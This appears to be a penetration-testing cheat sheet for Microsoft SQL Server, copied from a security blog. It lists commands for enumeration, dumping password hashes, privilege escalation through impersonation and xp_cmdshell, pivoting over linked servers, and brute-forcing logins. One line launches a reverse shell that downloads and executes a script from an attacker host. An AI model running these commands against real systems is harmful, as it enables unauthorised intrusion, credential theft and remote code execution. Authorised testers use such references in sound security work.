> Notes copied from [routezero.security](https://routezero.security/2025/03/29/mssql-cheat-sheet-for-penetration-testers/)

Microsoft SQL Server (MSSQL) is a common target in penetration testing due to misconfigurations, weak credentials, and privilege escalation opportunities. This cheat sheet provides enumeration techniques, privilege escalation methods, and exploitation tactics useful for pentesters and red teamers.

---

## 1. Connecting to MSSQL

- **Using** `sqsh` **(Linux)**
Connects to an MSSQL server using a specified username and password.

```
sqsh -S target-ip -U user -P password
```


- **Using** `impacket-mssqlclient`
Connects to MSSQL using Impacket’s `mssqlclient.py`.

```
python3 mssqlclient.py DOMAIN/user:password@target-ip
```


- **Using PowerShell (Windows)**
Connects to MSSQL using Impacket’s `sqlcmd`.
```
sqlcmd -S target-ip -U user -P password
```

If you have access to the machine where the DB is allocated, you can interact with it without creating an interactive shell.

```powershell
sqlcmd -S .\SQLEXPRESS -E -Q "SELECT * FROM CredentialsDB.dbo.Credentials"
```


---

## 2. Enumerating MSSQL

- **Checking MSSQL Version**
Retrieves MSSQL version information.

```
SELECT @@VERSION;
```


- **Listing Databases**
Displays all available databases.

```
SELECT name FROM master.dbo.sysdatabases;
```


- **Listing Tables**
Lists tables in a specific database.

```
SELECT name FROM <database_name>.sys.tables;
```

- **Querying Data**
Retrieves all the information from a Table.

```
SELECT *name* FROM <database_name>.dbo.<table_name>;
```

- **Listing Users**
Retrieves all users.
```
SELECT name FROM master.sys.syslogins;
```


- **Checking Privileges**
Checks if the current user has `sysadmin` privileges.

```
SELECT is_srvrolemember('sysadmin');
```



---

## 3. Credential Hunting & Privilege Escalation

- **Enumerate local users**

Retrives the machine local users using mssql.

```bash
nxc mssql <target> -u <user> -p <password> --rid-brute 10000 --local-auth
```

- **User Impersonation**

This command verifies whether the current user has permission to perform privilege escalation using the `mssql_priv` module of NetExec.

```bash
nxc mssql <target_ip> -u <user> -p <password> -M mssql_priv --local-auth
```

In the output, it will show us which user can be impersonated if impersonation is possible. Then, to perform the escalation, you can use:

```bash
EXECUTE AS LOGIN = '<target_user>';
```

- **Finding Stored Credentials**

Retrieves stored password hashes (if accessible).

```
SELECT name, password_hash FROM sys.sql_logins;
```


- **Enabling** `xp_cmdshell` **for Command Execution**

Enables `xp_cmdshell` to execute system commands.

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```


- **Executing System Commands with** `xp_cmdshell`

Runs system commands with MSSQL privileges.

```
EXEC xp_cmdshell 'whoami';
```


---

## 4. Exploiting MSSQL for Lateral Movement

- **Using MSSQL for Reverse Shell**
Executes a PowerShell-based reverse shell.

```
EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/rev.ps1')"';
```

- **Abusing MSSQL Linked Servers**
Lists linked servers (potential pivoting points).

```
EXEC sp_linkedservers;
```


- **Executing Commands on Linked Servers**
Runs commands on a linked MSSQL server.

```
EXEC ('whoami') AT linked_server_name;
```


---

## 5. Brute-Forcing MSSQL Credentials

- **Using** `hydra`
Attempts brute-force login.

```
hydra -L users.txt -P passwords.txt mssql://target-ip
```

Alternative brute-force attack.

```
medusa -h target-ip -U users.txt -P passwords.txt -M mssql
```
